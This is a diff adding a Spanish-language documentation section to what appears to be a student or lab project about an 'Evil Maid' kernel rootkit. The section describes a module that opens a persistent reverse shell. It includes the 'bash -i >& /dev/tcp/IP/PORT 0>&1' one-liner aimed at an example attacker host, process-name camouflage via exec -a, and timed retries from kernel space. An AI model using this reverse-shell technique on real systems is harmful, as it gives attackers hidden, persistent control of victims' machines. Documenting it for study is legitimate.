@@ -21,6 +21,39 @@ La implementación realizada de este ataque utiliza la virante que utiliza un m�
 
 ## Documentación del ataque
 
+Este módulo de kernel (`rootkit.c`) implementa un ataque tipo **"Evil Maid"**, en el que un atacante obtiene acceso físico al dispositivo y carga un módulo malicioso que establece una **reverse shell persistente**.
+
+Establecer una conexión remota desde el dispositivo comprometido hacia un servidor atacante, permitiendo el control total del sistema a través de una shell interactiva.
+
+**Funcionalidad del modulo**
+
+1. **Reverse shell**:
+   - Utiliza `bash` para conectarse al host atacante (`ej. 192.168.198.128`) en el puerto `4444`.
+   - Usa la sintaxis `bash -i >& /dev/tcp/IP/PORT 0>&1` para redirigir la entrada/salida estándar.
+
+2. **Ejecución desde el kernel**:
+   - Se ejecuta desde el espacio de kernel mediante `call_usermodehelper()`, una función que permite invocar comandos del espacio de usuario.
+
+3. **Camuflaje del proceso**:
+   - El shell se lanza con el nombre `EMShell` usando `exec -a`, lo que dificulta la detección mediante herramientas como `ps` o `top`.
+
+4. **Persistencia por reintento**:
+   - El módulo utiliza un `timer_list` del kernel que reintenta lanzar la shell cada 30 segundos si la conexión falla.
+  
+**Flujo del ataque**
+
+- Al cargar el módulo, se inicializa un temporizador.
+- Tras 1 segundo, intenta lanzar la reverse shell.
+- Si falla, espera 30 segundos y vuelve a intentarlo.
+- El proceso se repite indefinidamente mientras el módulo esté activo.
+
+**Riesgos de seguridad**
+
+- **Ejecución con privilegios de kernel**: Control total del sistema.
+- **Canal encubierto**: Comunicación saliente sin visibilidad para usuarios comunes.
+- **Difícil de detectar**: Camuflaje del proceso y ejecución desde bajo nivel.
+- **Ideal para Evil Maid**: Puede ser precargado en sistemas antes de que el usuario legítimo lo utilice, especialmente vía USB o acceso físico.
+
 ## Autoevaluación
 
 ### Estado Final:
